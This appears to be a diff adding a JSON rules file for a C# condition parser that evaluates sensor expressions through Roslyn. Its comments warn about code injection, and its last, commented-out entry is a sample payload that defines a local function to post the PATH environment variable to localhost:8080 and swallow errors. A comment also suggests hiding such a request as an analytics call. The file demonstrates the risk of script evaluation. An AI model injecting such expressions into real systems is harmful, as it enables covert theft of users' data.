@@ -1,0 +1,20 @@
+﻿{
+  "conditions": [
+    "sensor('temperature') > 30",
+    "sensor('poolTemperature') > 10",
+    // downside of using roslyn: All methods of the object can also be used as part of the expression
+    "sensor('poolTemperature').GetType().ToString().Length > 20",
+
+    // Code execution sample (demonstrating how bad scripting can be):
+    // the condition is injected into this piece of code: "return {condition};" and must evaluate to a boolean (see ConditionParser.cs MakeGlobalsAccessible()).
+
+    // C# allows local functions https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-7#local-functions
+    // and we can call those before they are defined
+    // so create a function that returns true and call it
+    // then define it and have it do some evil stuff before returning the boolean
+    // if you set up a webserver at the address (localhost:8080) that accepts posts to '/'
+    // you will get sent some of your own data.
+    // an attacker could send your data to his server using all sorts of tricks to make the http request look legit e.g. "known-analytics-provider.tld/query.js?uid=totallyNotYourDataInEncryptedForm"
+    // "evil(); bool evil() { try { var client = new System.Net.Http.HttpClient(); client.Timeout = System.TimeSpan.FromSeconds(1); var message = new System.Net.Http.StringContent(System.Environment.GetEnvironmentVariable('PATH')); client.PostAsync('http://localhost:8080', message).GetAwaiter().GetResult(); } catch { /* silently continue on error */ } return true; } // roslyn does not like the trailing ; so just make it part of this comment"
+  ]
+}
